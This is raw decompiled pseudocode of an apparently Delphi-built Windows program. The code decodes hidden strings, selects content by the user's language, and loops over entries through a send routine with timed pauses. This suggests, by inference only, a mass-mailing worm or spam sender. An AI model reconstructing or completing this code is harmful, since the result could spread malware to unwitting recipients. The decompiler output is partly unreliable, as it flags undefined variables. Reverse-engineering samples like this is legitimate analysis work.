  char *v15; // [esp+8h] [ebp-Ch] BYREF
  DWORD dwFlags; // [esp+Ch] [ebp-8h] BYREF
  int v17; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v17 = 0;
  dwFlags = 0;
  v15 = 0;
  v14 = 0;
  v13 = 0;
  v12 = a2;
  HIBYTE(v17) = a1;
  v11 = (LStr *)&savedregs;
  v10[1] = (unsigned int)&loc_418F7C;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  sub_415EAC((int)a, (char *)dword_418F94, 0, &v14, 1, 0);
  System::__linkproc__ LStrCmp(v2, (char *)dword_418FA0);
  if ( v3 )
  {
    v4 = -InternetGetConnectedState(&dwFlags, 0);
    v5 = v4 != 0;
    if ( v4 )
      __linkproc__ LStrLAsg(&v15, (char *)dword_418FAC);
    else
      __linkproc__ LStrLAsg(&v15, (char *)dword_418FA0);
    sub_415EAC((int)a, (char *)sub_418FB8, v15, &v13, 1, 1);
    if ( v5 && HIBYTE(v17) )
      LOBYTE(v6) = 1;
    else
      v6 = 0;
    v7 = v6;
  }
  else
  {
    v7 = 0;
  }
  v8 = v11;
  __writefsdword(0, v10[0]);
  v11 = (LStr *)&loc_418F83;
  System::__linkproc__ LStrArrayClr(v8, 3);
  return v7;
}
// 418EBC: could not find valid save-restore pair for ebx
// 418EF9: variable 'v2' is possibly undefined
// 418EFE: variable 'v3' is possibly undefined
// 418F5B: variable 'v6' is possibly undefined
// 418F94: using guessed type int dword_418F94[3];
// 418FA0: using guessed type int dword_418FA0[3];
// 418FAC: using guessed type int dword_418FAC[3];
// 418FB8: using guessed type int sub_418FB8();

//----- (00418FBC) --------------------------------------------------------
char __usercall sub_418FBC@<al>(char *a1@<eax>, int a2@<edi>, int a3@<esi>)
{
  LStr *v3; // ecx
  unsigned int v5[2]; // [esp-18h] [ebp-24h] BYREF
  void **v6; // [esp-10h] [ebp-1Ch]
  _DWORD v7[3]; // [esp-Ch] [ebp-18h] BYREF
  char **v8; // [esp+0h] [ebp-Ch]
  unsigned int v9; // [esp+4h] [ebp-8h]
  char *v10; // [esp+8h] [ebp-4h]
  LStr *savedregs; // [esp+Ch] [ebp+0h] BYREF

  v10 = a1;
  sub_4038D8((int)a1);
  v7[2] = &savedregs;
  v7[1] = &loc_419052;
  v7[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v8 = sub_412D28((char **)dword_412D04, 1);
  v6 = (void **)&savedregs;
  v5[1] = (unsigned int)&loc_419035;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  __linkproc__ LStrAsg(v8 + 3, v10);
  HIBYTE(v9) = sub_412EA0((int)v8, a2);
  if ( HIBYTE(v9) )
    sub_412F7C((int)v8, a2, a3);
  __writefsdword(0, v5[0]);
  v6 = (void **)&loc_41903C;
  sub_402BDC(v8);
  v3 = savedregs;
  __writefsdword(0, v9);
  savedregs = (LStr *)&loc_419059;
  System::__linkproc__ LStrClr(v3);
  return HIBYTE(v9);
}
// 412D04: using guessed type int dword_412D04[2];

//----- (00419074) --------------------------------------------------------
void __usercall sub_419074(char **a1@<eax>)
{
  DWORD dwFlags; // [esp+4h] [ebp-4h] BYREF

  __linkproc__ LStrAsg(a1, (char *)dword_4190BC);
  if ( InternetGetConnectedState(&dwFlags, 0) )
  {
    if ( (dwFlags & 1) == 1 )
      __linkproc__ LStrAsg(a1, (char *)&dword_4190C8);
  }
}
// 4190BC: using guessed type int dword_4190BC[3];
// 4190C8: using guessed type int dword_4190C8;

//----- (004190CC) --------------------------------------------------------
void __usercall sub_4190CC(int a1@<edi>, int a2@<esi>)
{
  int v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  int v5; // ebx
  LANGID v6; // ax
  char *v7; // ecx
  char v8; // zf
  int v9; // eax
  LStr *v10; // ecx
  LStr *v11; // ecx
  int v12; // eax
  char *v13; // ecx
  int v14; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *v15; // ebx
  int v16; // eax
  char *v17; // ecx
  LStr *v18; // ecx
  LStr *v19; // ecx
  LStr *v20; // ecx
  LStr *v21; // ecx
  char *v22; // [esp-18h] [ebp-2B4h]
  char **v23; // [esp-14h] [ebp-2B0h] BYREF
  int v24; // [esp-10h] [ebp-2ACh]
  int v25; // [esp-Ch] [ebp-2A8h] BYREF
  void *v26; // [esp-8h] [ebp-2A4h]
  int *v27; // [esp-4h] [ebp-2A0h]
  LStr *v28; // [esp+0h] [ebp-29Ch]
  char *v29; // [esp+4h] [ebp-298h] BYREF
  char *v30; // [esp+8h] [ebp-294h] BYREF
  char *v31; // [esp+Ch] [ebp-290h] BYREF
  char v32; // [esp+10h] [ebp-28Ch] BYREF
  char *v33; // [esp+14h] [ebp-288h] BYREF
  char *v34; // [esp+18h] [ebp-284h] BYREF
  char *v35; // [esp+1Ch] [ebp-280h] BYREF
  char *v36; // [esp+20h] [ebp-27Ch] BYREF
  char *v37; // [esp+24h] [ebp-278h] BYREF
  char *v38; // [esp+28h] [ebp-274h] BYREF
  char *v39; // [esp+2Ch] [ebp-270h] BYREF
  char *v40; // [esp+30h] [ebp-26Ch] BYREF
  char *v41; // [esp+34h] [ebp-268h] BYREF
  char *v42; // [esp+38h] [ebp-264h] BYREF
  int v43; // [esp+3Ch] [ebp-260h] BYREF
  BYTE *v44; // [esp+40h] [ebp-25Ch] BYREF
  char *v45; // [esp+44h] [ebp-258h] BYREF
  char **v46; // [esp+48h] [ebp-254h] BYREF
  BYTE *v47; // [esp+4Ch] [ebp-250h] BYREF
  char *v48; // [esp+50h] [ebp-24Ch] BYREF
  char *v49; // [esp+54h] [ebp-248h] BYREF
  char *v50; // [esp+58h] [ebp-244h] BYREF
  char *v51; // [esp+5Ch] [ebp-240h] BYREF
  char *v52; // [esp+60h] [ebp-23Ch] BYREF
  unsigned __int8 v53[256]; // [esp+64h] [ebp-238h] BYREF
  BYTE *v54; // [esp+164h] [ebp-138h] BYREF
  BYTE *v55; // [esp+168h] [ebp-134h] BYREF
  char *v56; // [esp+16Ch] [ebp-130h] BYREF
  char *v57; // [esp+170h] [ebp-12Ch] BYREF
  char *v58; // [esp+174h] [ebp-128h] BYREF
  char *v59; // [esp+178h] [ebp-124h] BYREF
  char *v60; // [esp+17Ch] [ebp-120h] BYREF
  char *v61; // [esp+180h] [ebp-11Ch] BYREF
  char *v62; // [esp+184h] [ebp-118h] BYREF
  BYTE *v63; // [esp+188h] [ebp-114h] BYREF
  BYTE *v64; // [esp+18Ch] [ebp-110h] BYREF
  char *v65; // [esp+190h] [ebp-10Ch] BYREF
  char *v66; // [esp+194h] [ebp-108h] BYREF
  char *v67; // [esp+198h] [ebp-104h] BYREF
  char *v68; // [esp+19Ch] [ebp-100h] BYREF
  char *v69; // [esp+1A0h] [ebp-FCh] BYREF
  char *v70; // [esp+1A4h] [ebp-F8h] BYREF
  char *v71; // [esp+1A8h] [ebp-F4h] BYREF
  char *v72; // [esp+1ACh] [ebp-F0h] BYREF
  char *v73; // [esp+1B0h] [ebp-ECh] BYREF
  char *v74; // [esp+1B4h] [ebp-E8h] BYREF
  char v75[4]; // [esp+1B8h] [ebp-E4h] BYREF
  unsigned __int8 v76; // [esp+1BCh] [ebp-E0h] BYREF
  CHAR v77; // [esp+1BDh] [ebp-DFh]
  char v78[4]; // [esp+1C0h] [ebp-DCh] BYREF
  char v79[4]; // [esp+1C4h] [ebp-D8h] BYREF
  BYTE *v80; // [esp+1C8h] [ebp-D4h] BYREF
  char *v81; // [esp+1CCh] [ebp-D0h] BYREF
  char *v82; // [esp+1D0h] [ebp-CCh] BYREF
  char *v83; // [esp+1D4h] [ebp-C8h] BYREF
  char *v84; // [esp+1D8h] [ebp-C4h] BYREF
  char *v85; // [esp+1DCh] [ebp-C0h] BYREF
  char *v86; // [esp+1E0h] [ebp-BCh] BYREF
  BYTE *v87; // [esp+1E4h] [ebp-B8h] BYREF
  char *v88; // [esp+1E8h] [ebp-B4h] BYREF
  char *v89; // [esp+1ECh] [ebp-B0h] BYREF
  char *v90; // [esp+1F0h] [ebp-ACh] BYREF
  char *v91; // [esp+1F4h] [ebp-A8h] BYREF
  char *v92; // [esp+1F8h] [ebp-A4h] BYREF
  char *v93; // [esp+1FCh] [ebp-A0h] BYREF
  CHAR szLang[21]; // [esp+203h] [ebp-99h] BYREF
  int v95; // [esp+218h] [ebp-84h]
  char *v96; // [esp+21Ch] [ebp-80h]
  char v97; // [esp+223h] [ebp-79h]
  _DWORD *v98; // [esp+224h] [ebp-78h]
  _DWORD *v99; // [esp+228h] [ebp-74h]
  char *i; // [esp+22Ch] [ebp-70h] BYREF
  int v101; // [esp+230h] [ebp-6Ch]
  int v102; // [esp+234h] [ebp-68h] BYREF
  char *v103; // [esp+238h] [ebp-64h] BYREF
  int v104; // [esp+23Ch] [ebp-60h]
  char *v105; // [esp+240h] [ebp-5Ch] BYREF
  char *v106; // [esp+244h] [ebp-58h] BYREF
  char *v107; // [esp+248h] [ebp-54h]
  char *v108; // [esp+24Ch] [ebp-50h]
  char *v109; // [esp+250h] [ebp-4Ch] BYREF
  int v110; // [esp+254h] [ebp-48h]
  OLECHAR *v111; // [esp+258h] [ebp-44h] BYREF
  char **v112; // [esp+25Ch] [ebp-40h] BYREF
  char **v113; // [esp+260h] [ebp-3Ch] BYREF
  char **v114; // [esp+264h] [ebp-38h] BYREF
  char *v115; // [esp+268h] [ebp-34h] BYREF
  char *v116; // [esp+26Ch] [ebp-30h] BYREF
  char *v117; // [esp+270h] [ebp-2Ch] BYREF
  char *v118; // [esp+274h] [ebp-28h] BYREF
  BYTE *v119; // [esp+278h] [ebp-24h] BYREF
  char *v120; // [esp+27Ch] [ebp-20h] BYREF
  char *v121; // [esp+280h] [ebp-1Ch] BYREF
  char *v122; // [esp+284h] [ebp-18h] BYREF
  char *v123; // [esp+288h] [ebp-14h] BYREF
  char *v124; // [esp+28Ch] [ebp-10h] BYREF
  char *v125; // [esp+290h] [ebp-Ch] BYREF
  char **v126; // [esp+294h] [ebp-8h] BYREF
  char *v127; // [esp+298h] [ebp-4h] BYREF
  int savedregs; // [esp+29Ch] [ebp+0h] BYREF

  v27 = &savedregs;
  v26 = &loc_41A017;
  v25 = (int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v25);
  TObject_Create(&off_40BBB4);
  dword_41EF14 = v2;
  TObject_Create(&off_40BBB4);
  v99 = v3;
  TObject_Create(&off_40BBB4);
  v98 = v4;
  LOBYTE(v5) = 1;
  v101 = 0;
  sub_415FAC((int)dword_41A02C, 0, &v93);
  __linkproc__ LStrAsg(&dword_41EEF4, v93);
  sub_415FAC((int)dword_41A064, 0, &v92);
  sub_415EAC((int)dword_41EEF4, v92, 0, &v127, 0, 0);
  if ( v127 )
  {
    sub_415FAC((int)dword_41A084, 0, &v91);
    System::__linkproc__ LStrCatN(&v127, 4);
    v25 = 0;
    sub_415FAC((int)dword_41A0A4, 0, &v90);
    sub_415EAC((int)v127, v90, 0, (char **)&v126, 0, v25);
    v25 = 0;
    sub_415FAC((int)dword_41A0C0, 0, &v89);
    sub_415EAC((int)v127, v89, 0, &v125, 0, v25);
    v25 = 0;
    sub_415FAC((int)dword_41A0D4, 0, &v88);
    sub_415EAC((int)v127, v88, 0, &v124, 0, v25);
  }
  else
  {
    sub_415FAC((int)dword_41A0F0, 0, &v125);
    sub_41609C(5, &v87);
    v24 = (int)v87;
    v23 = (char **)dword_41A108;
    System::__linkproc__ LStrCatN((char **)&v126, 3);
    sub_41609C(5, (BYTE **)&v124);
  }
  sub_415EAC((int)a, "FB1BB", 0, &v116, 1, 0);
  sub_415EAC((int)a, "FB1BC", 0, &v115, 1, 0);
  sub_4045A0((int *)&v112, (int)dword_419064, 1, 6);
  __linkproc__ LStrAsg(v112 + 1, v125);
  sub_415EAC((int)a, "FB1BA", 0, &v86, 1, 0);
  __linkproc__ LStrAsg(v112 + 2, v86);
  sub_415FAC((int)dword_41A144, 0, &v85);
  __linkproc__ LStrAsg(v112 + 5, v85);
  sub_415FAC((int)dword_41A158, 0, &v84);
  __linkproc__ LStrAsg(v112 + 4, v84);
  sub_415FAC((int)dword_41A16C, 0, &v83);
  __linkproc__ LStrAsg(v112 + 3, v83);
  v104 = 1;
  v97 = 0;
  do
  {
    if ( sub_418FBC(v112[v104], a1, a2) )
    {
      v97 = 1;
      __linkproc__ LStrLAsg(&v125, v112[v104]);
      v104 = 5;
    }
    ++v104;
  }
  while ( v104 <= 5 );
  sub_415EAC((int)a, (char *)dword_41A188, v125, &v82, 1, 1);
  if ( v97 )
    __linkproc__ LStrLAsg(&v117, (char *)dword_41A194);
  else
    __linkproc__ LStrLAsg(&v117, (char *)dword_41A1A0);
  sub_415EAC((int)a, (char *)dword_41A1AC, v117, &v81, 1, 1);
  v25 = 20;
  v6 = GetUserDefaultLangID();
  VerLanguageNameA(v6, szLang, v25);
  sub_4045A0((int *)&v114, (int)dword_419064, 1, 5);
  v79[1] = szLang[0];
  v79[0] = 1;
  sub_402848(v78, v79);
  v77 = szLang[1];
  v76 = 1;
  __linkproc__ PStrNCat((unsigned __int8 *)v78, &v76, 2u);
  sub_402848(v75, v78);
  v77 = szLang[2];
  v76 = 1;
  __linkproc__ PStrNCat((unsigned __int8 *)v75, &v76, 3u);
  sub_4036EC(&v80, (unsigned __int8 *)v75);
  v25 = (int)v80;
  sub_415FAC((int)dword_41A1B8, 0, &v74);
  System::__linkproc__ LStrCmp(v7, v74);
  if ( v8 )
  {
    sub_415FAC((int)dword_41A1C4, 0, &v123);
    sub_415FAC((int)dword_41A1E0, 0, &v122);
    sub_415FAC((int)dword_41A204, 0, &v73);
    __linkproc__ LStrAsg(v114 + 1, v73);
    sub_415FAC((int)dword_41A244, 0, &v72);
    __linkproc__ LStrAsg(v114 + 2, v72);
    sub_415FAC((int)dword_41A280, 0, &v71);
    __linkproc__ LStrAsg(v114 + 3, v71);
    sub_415FAC((int)dword_41A2B4, 0, &v70);
    __linkproc__ LStrAsg(v114 + 4, v70);
  }
  else
  {
    sub_415FAC((int)dword_41A2F4, 0, &v123);
    sub_415FAC((int)dword_41A310, 0, &v122);
    sub_415FAC((int)dword_41A330, 0, &v69);
    __linkproc__ LStrAsg(v114 + 1, v69);
    sub_415FAC((int)dword_41A36C, 0, &v68);
    __linkproc__ LStrAsg(v114 + 2, v68);
    sub_415FAC((int)dword_41A3A8, 0, &v67);
    __linkproc__ LStrAsg(v114 + 3, v67);
    sub_415FAC((int)dword_41A3DC, 0, &v66);
    __linkproc__ LStrAsg(v114 + 4, v66);
  }
  v9 = sub_4028F4(4u);
  __linkproc__ LStrLAsg(&v121, v114[v9 + 1]);
  System::__linkproc__ LStrClr(v10);
  v25 = 0;
  sub_415FAC((int)dword_41A41C, 0, &v65);
  v22 = v65;
  System::__linkproc__ LStrCat3(&v64, (BYTE *)a, "\\FA0");
  sub_415EAC((int)v64, v22, 0, &v120, 1, v25);
  v106 = (char *)System::__linkproc__ ValLong((int)v120, &v106);
  if ( v106 )
  {
    sub_415FAC((int)dword_41A438, 0, &v62);
    System::__linkproc__ LStrCat3(&v63, (BYTE *)dword_41EEE8, v62);
    (*(void (**)(void))(*v99 + 88))();
    --v106;
  }
  else
  {
    sub_415EAC((int)a, "FB1B", 0, &v118, 1, 0);
    sub_415EAC((int)a, "FC43", (char *)dword_41A45C, &v61, 1, 1);
    sub_415EAC((int)a, (char *)dword_41A478, 0, &v60, 1, 1);
    if ( !sub_4071A8(v118) )
      LOBYTE(v5) = 0;
  }
  v25 = 1;
  sub_419074(&v58);
  sub_415EAC((int)a, "FD11", v58, &v59, 1, v25);
  if ( (_BYTE)v5 )
  {
    sub_4045A0((int *)&v111, (int)dword_419064, 1, 5);
    __linkproc__ LStrAsg((char **)v111 + 1, (char *)dword_41A494);
    __linkproc__ LStrAsg((char **)v111 + 2, (char *)dword_41A4A0);
    __linkproc__ LStrAsg((char **)v111 + 3, (char *)dword_41A4AC);
    __linkproc__ LStrAsg((char **)v111 + 4, (char *)dword_41A4B8);
    sub_4045A0((int *)&v113, (int)dword_419064, 1, 8);
    __linkproc__ LStrAsg(v113 + 1, (char *)dword_41A4C4);
    __linkproc__ LStrAsg(v113 + 2, (char *)dword_41A4C4);
    __linkproc__ LStrAsg(v113 + 3, (char *)dword_41A4C4);
    __linkproc__ LStrAsg(v113 + 4, (char *)dword_41A4D0);
    __linkproc__ LStrAsg(v113 + 5, (char *)dword_41A4DC);
    __linkproc__ LStrAsg(v113 + 6, (char *)dword_41A4E8);
    __linkproc__ LStrAsg(v113 + 7, (char *)dword_41A4F4);
    System::__linkproc__ LStrClr(v11);
    sub_415EAC((int)a, "FC42", 0, &v57, 1, 0);
    v105 = (char *)System::__linkproc__ ValLong((int)v57, &v105);
    if ( !v105 || v105 == (char *)7 )
      v104 = 1;
    sub_415EAC((int)a, "FC421", 0, &v56, 1, 0);
    for ( i = (char *)System::__linkproc__ ValLong((int)v56, &i); v104 <= 7; ++v104 )
    {
      sub_415FAC((int)dword_41A520, 0, (char **)&v55);
      System::__linkproc__ LStrCat3(&v119, v55, v113[v104]);
      v25 = 0;
      v24 = 1;
      v23 = &v120;
      System::__linkproc__ LStrCat3(&v54, (BYTE *)a, "\\FA0");
      sub_415EAC((int)v54, (char *)v119, 0, v23, v24, v25);
      v109 = (char *)System::__linkproc__ ValLong((int)v120, &v109);
      if ( v109 && (int)v109 > 0 )
      {
        v96 = v109;
        v110 = 1;
        do
        {
          (*(void (**)(void))(*(_DWORD *)dword_41EF14 + 64))();
          sub_40296C(v110, v53);
          sub_4036EC((BYTE **)&dword_41EEF4, v53);
          v25 = (int)dword_41EEE8;
          v24 = (int)dword_41A098;
          v23 = (char **)v119;
          sub_415FAC((int)"9luv", 0, &v51);
          System::__linkproc__ LStrCatN(&v52, 5);
          (*(void (**)(void))(*(_DWORD *)dword_41EF14 + 88))();
          v108 = (char *)((*(int (**)(void))(*(_DWORD *)dword_41EF14 + 20))() - 1);
          if ( (int)v108 >= (int)i )
          {
            v95 = v108 - i + 1;
            v107 = i;
            do
            {
              sub_415EAC((int)a, (char *)dword_41A548, (char *)dword_41A53C, &v50, 1, 1);
              if ( (unsigned __int8)sub_418EBC(v97, (unsigned __int8)v5) )
              {
                if ( !v117 || v101 == 8 )
                {
                  v101 = 0;
                  if ( v118
                    || (v12 = sub_4028F4((unsigned int)v106),
                        (*(void (__fastcall **)(char **, int))(*v99 + 12))(&v49, v12),
                        __linkproc__ LStrAsg(&dword_41EEF4, v49),
                        !sub_4071A8(dword_41EEF4)) )
                  {
                    __linkproc__ LStrLAsg(&v117, v118);
                  }
                  else
                  {
                    Sysutils::ExtractFileName(dword_41EEF4, &v117);
                    sub_41620C((int)v117, &v47);
                    sub_415FAC((int)v47, 1, &v48);
                    System::__linkproc__ LStrCmp(v13, (char *)dword_41A554);
                    if ( !v8 )
                    {
                      v25 = (int)v117;
                      v24 = (int)dword_41A560;
                      v14 = sub_4028F4(4u);
                      sub_415FAC(*(_DWORD *)&v111[2 * v14 + 2], 0, (char **)&v46);
                      v23 = v46;
                      System::__linkproc__ LStrCatN(&v117, 3);
                    }
                    v25 = dword_41EEF0;
                    v24 = (int)dword_41A098;
                    v23 = (char **)v117;
                    System::__linkproc__ LStrCatN(&v45, 3);
                    if ( !sub_4071A8(v45) )
                    {
                      v25 = (int)v117;
                      v24 = (int)v125;
                      v23 = v126;
                      System::__linkproc__ LStrCat3(&v44, (BYTE *)dword_41EEF0, (char *)dword_41A098);
                      sub_4171C0((char *)dword_41EED8, dword_41EEF4, v44, 0, (int)v23, v24, (char *)v25);
                    }
                  }
                }
                dword_41EF1C = (int)sub_412560(dword_412544, 1);
                v25 = (int)&savedregs;
                v24 = (int)&loc_419F4E;
                v23 = (char **)NtCurrentTeb()->NtTib.ExceptionList;
                __writefsdword(0, (unsigned int)&v23);
                System::__linkproc__ LStrCatN((char **)(dword_41EF1C + 12), 5);
                v15 = *(struct _EXCEPTION_REGISTRATION_RECORD **)dword_41EF14;
                (*(void (__fastcall **)(int *, char *))(*(_DWORD *)dword_41EF14 + 12))(&v43, v107);
                (*(void (**)(void))(**(_DWORD **)(dword_41EF1C + 16) + 52))();
                v25 = (int)&dword_41EEF4;
                v16 = __linkproc__ LStrPos((char)dword_41A560, v117);
                __linkproc__ LStrCopy(v117, 1, v16 - 1, (char **)v25);
                __linkproc__ LStrAsg((char **)(dword_41EF1C + 20), dword_41EEF4);
                (*(void (**)(void))(*v98 + 64))();
                (*(void (**)(void))(*v98 + 52))();
                (*(void (**)(void))(*v98 + 52))();
                (*(void (**)(void))(*v98 + 52))();
                (*(void (**)(void))(*v98 + 52))();
                (*(void (**)(void))(*v98 + 52))();
                sub_412620(dword_41EF1C, (int)v98);
                v25 = dword_41EEF0;
                v24 = (int)dword_41A098;
                v23 = (char **)v117;
                System::__linkproc__ LStrCatN(&v42, 3);
                sub_412708(dword_41EF1C, v42, (int)v15, a1, a2);
                sub_412844(dword_41EF1C, v15, a1, a2);
                sub_412A08(dword_41EF1C, a1);
                (*(void (__fastcall **)(char **, char *))(*(_DWORD *)dword_41EF14 + 12))(&v41, v107);
                System::__linkproc__ LStrCmp(v17, v41);
                if ( v8 )
                {
                  sub_415FAC((int)dword_41A59C, 0, &v40);
                  (*(void (__fastcall **)(char *, char *))(*(_DWORD *)dword_41EF14 + 32))(v40, v107);
                }
                if ( !v107 && !v115 )
                {
                  (*(void (__fastcall **)(char *, char *))(*(_DWORD *)dword_41EF14 + 32))(v116, v107);
                  sub_415EAC((int)a, "FB1BC", (char *)dword_41A194, &v39, 1, 1);
                  __linkproc__ LStrLAsg(&v115, (char *)dword_41A194);
                }
                sub_415EAC((int)a, (char *)dword_41A548, (char *)dword_41A5B8, &v38, 1, 1);
                v25 = *(_DWORD *)(dword_41EF1C + 8);
                v5 = *(_DWORD *)dword_41EF14;
                (*(void (__fastcall **)(char **, char *))(*(_DWORD *)dword_41EF14 + 12))(&v37, v107);
                if ( sub_413258((char *)v126, v37, v125, v5, a1, a2, v25) )
                {
                  sub_415EAC((int)a, (char *)dword_41A5C4, 0, &v36, 1, 0);
                  v103 = (char *)(System::__linkproc__ ValLong((int)v36, &v103) + 1);
                  sub_40296C((int)v103, v53);
                  sub_4036EC((BYTE **)&dword_41EEF4, v53);
                  sub_415EAC((int)a, (char *)dword_41A5C4, dword_41EEF4, &v35, 1, 1);
                  ++v101;
                  sub_415EAC((int)a, (char *)dword_41A548, (char *)dword_41A5D0, &v34, 1, 1);
                  sub_415EAC((int)a, "FD11", 0, &v33, 1, 0);
                  v102 = System::__linkproc__ ValLong((int)v33, (char **)&v102);
                  Sleep(60000 * v102);
                  v25 = 1;
                  v24 = 1;
                  v23 = (char **)&v32;
                  v5 = *(_DWORD *)dword_41EF14;
                  (*(void (__fastcall **)(char **, char *))(*(_DWORD *)dword_41EF14 + 12))(&v31, v107);
                  sub_415EAC((int)a, "FD10", v31, v23, v24, v25);
                  sub_40296C((int)v107, v53);
                  sub_4036EC((BYTE **)&dword_41EEF4, v53);
                  sub_415EAC((int)a, "FC421", dword_41EEF4, &v30, 1, 1);
                  if ( v107 == v108 )
                  {
                    __linkproc__ LStrAsg(&dword_41EEF4, (char *)dword_41A1A0);
                  }
                  else
                  {
                    sub_40296C(v104, v53);
                    sub_4036EC((BYTE **)&dword_41EEF4, v53);
                  }
                  sub_415EAC((int)a, "FC42", dword_41EEF4, &v29, 1, 1);
                }
                __writefsdword(0, (unsigned int)v26);
                v28 = (LStr *)&loc_419F55;
                sub_402BDC((_DWORD *)dword_41EF1C);
              }
              ++v107;
              --v95;
            }
            while ( v95 );
          }
          ++v110;
          --v96;
        }
        while ( v96 );
      }
      if ( (unsigned __int8)sub_418EBC(v97, (unsigned __int8)v5) )
      {
        if ( v104 == 7 )
          v104 = 1;
      }
      else
      {
        v104 = 7;
      }
    }
  }
  sub_402BDC((_DWORD *)dword_41EF14);
  sub_402BDC(v99);
  sub_402BDC(v98);
  v18 = v28;
  __writefsdword(0, (unsigned int)v26);
  v28 = (LStr *)&loc_41A01E;
  System::__linkproc__ LStrArrayClr(v18, 24);
  System::__linkproc__ LStrArrayClr(v19, 21);
  System::__linkproc__ LStrArrayClr(v20, 14);
  System::__linkproc__ FinalizeArray(&v111, (char *)dword_419064, 4);
  System::__linkproc__ LStrArrayClr(v21, 13);
}
// 4190F6: variable 'v2' is possibly undefined
// 419107: variable 'v3' is possibly undefined
// 419116: variable 'v4' is possibly undefined
// 4194DC: variable 'v7' is possibly undefined
// 4194E1: variable 'v8' is possibly undefined
// 41965C: variable 'v10' is possibly undefined
// 41986E: variable 'v11' is possibly undefined
// 419ACC: variable 'v13' is possibly undefined
// 419CDC: variable 'v17' is possibly undefined
// 419FE1: variable 'v19' is possibly undefined
// 419FF1: variable 'v20' is possibly undefined
// 41A011: variable 'v21' is possibly undefined
// 40BBB4: using guessed type void *off_40BBB4;
// 412544: using guessed type int dword_412544[2];
// 419064: using guessed type int dword_419064[2];
// 41A02C: using guessed type int dword_41A02C[12];
// 41A064: using guessed type int dword_41A064[6];
// 41A084: using guessed type int dword_41A084[5];
// 41A098: using guessed type int dword_41A098[3];
// 41A0A4: using guessed type int dword_41A0A4[7];
// 41A0C0: using guessed type int dword_41A0C0[5];
// 41A0D4: using guessed type int dword_41A0D4[7];
// 41A0F0: using guessed type int dword_41A0F0[6];
// 41A108: using guessed type int dword_41A108[3];
// 41A144: using guessed type int dword_41A144[5];
// 41A158: using guessed type int dword_41A158[5];
// 41A16C: using guessed type int dword_41A16C[7];
// 41A188: using guessed type int dword_41A188[3];
// 41A194: using guessed type int dword_41A194[3];
// 41A1A0: using guessed type int dword_41A1A0[3];
// 41A1AC: using guessed type int dword_41A1AC[3];
// 41A1B8: using guessed type int dword_41A1B8[3];
// 41A1C4: using guessed type int dword_41A1C4[7];
// 41A1E0: using guessed type int dword_41A1E0[9];
// 41A204: using guessed type int dword_41A204[16];
// 41A244: using guessed type int dword_41A244[15];
// 41A280: using guessed type int dword_41A280[13];
// 41A2B4: using guessed type int dword_41A2B4[14];
// 41A2F4: using guessed type int dword_41A2F4[5];
// 41A310: using guessed type int dword_41A310[8];
// 41A330: using guessed type int dword_41A330[15];
// 41A36C: using guessed type int dword_41A36C[15];
// 41A3A8: using guessed type int dword_41A3A8[13];
// 41A3DC: using guessed type int dword_41A3DC[16];
// 41A41C: using guessed type int dword_41A41C[3];
// 41A438: using guessed type int dword_41A438[3];
// 41A45C: using guessed type int dword_41A45C[3];
// 41A478: using guessed type int dword_41A478[3];
// 41A494: using guessed type int dword_41A494[3];
// 41A4A0: using guessed type int dword_41A4A0[3];
// 41A4AC: using guessed type int dword_41A4AC[3];
// 41A4B8: using guessed type int dword_41A4B8[3];
// 41A4C4: using guessed type int dword_41A4C4[3];
// 41A4D0: using guessed type int dword_41A4D0[3];
// 41A4DC: using guessed type int dword_41A4DC[3];
// 41A4E8: using guessed type int dword_41A4E8[3];
// 41A4F4: using guessed type int dword_41A4F4[3];
// 41A520: using guessed type int dword_41A520[3];
// 41A53C: using guessed type int dword_41A53C[3];
// 41A548: using guessed type int dword_41A548[3];
// 41A554: using guessed type int dword_41A554[3];
// 41A560: using guessed type int dword_41A560[3];
// 41A59C: using guessed type int dword_41A59C[7];
// 41A5B8: using guessed type int dword_41A5B8[3];
// 41A5C4: using guessed type int dword_41A5C4[3];
// 41A5D0: using guessed type int dword_41A5D0[3];
// 41EED8: using guessed type int dword_41EED8;
// 41EEF0: using guessed type int dword_41EEF0;
// 41EF14: using guessed type int dword_41EF14;
// 41EF1C: using guessed type int dword_41EF1C;

//----- (0041A5E4) --------------------------------------------------------
void __usercall sub_41A5E4(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  LStr *v3; // ecx
  unsigned int v4[2]; // [esp-Ch] [ebp-28h] BYREF
  LStr *v5; // [esp-4h] [ebp-20h]
  char *v6; // [esp+0h] [ebp-1Ch] BYREF
  char *v7; // [esp+4h] [ebp-18h] BYREF
  char *v8; // [esp+8h] [ebp-14h] BYREF
  char *v9; // [esp+Ch] [ebp-10h] BYREF
  char *v10; // [esp+10h] [ebp-Ch] BYREF
  char *v11; // [esp+14h] [ebp-8h] BYREF
  int v12; // [esp+18h] [ebp-4h] BYREF
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v12 = 0;
  v11 = 0;
  v10 = 0;
  v9 = 0;
  v8 = 0;
  v7 = 0;
  v6 = 0;
  v5 = (LStr *)&savedregs;
  v4[1] = (unsigned int)&loc_41A6FA;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_415EAC((int)a, (char *)dword_41A710, 0, &v11, 1, 0);
  v12 = System::__linkproc__ ValLong((int)v11, (char **)&v12);
  if ( dword_41EF10 == 1 )
  {
    sub_415FAC((int)dword_41A71C, 0, &v10);
    __linkproc__ LStrAsg(&dword_41EEF4, v10);
    sub_415FAC((int)dword_41A74C, 0, &v8);
    sub_415EAC((int)dword_41EEF4, v8, dword_41EEE4, &v9, 0, 1);
  }
  if ( v12 <= 0 && dword_41EF10 >= 2 )
  {
    sub_415EAC((int)a, "FC43", 0, &v7, 1, 0);
    sub_417F24((int)v7, a2);
    sub_415EAC((int)a, (char *)dword_41A710, (char *)&dword_41A778, &v6, 1, 1);
  }
  if ( v12 <= 1 && dword_41EF10 >= 2 && (unsigned __int8)sub_418EBC(1, a1) )
    sub_4190CC(a2, a3);
  v3 = v5;
  __writefsdword(0, v4[0]);
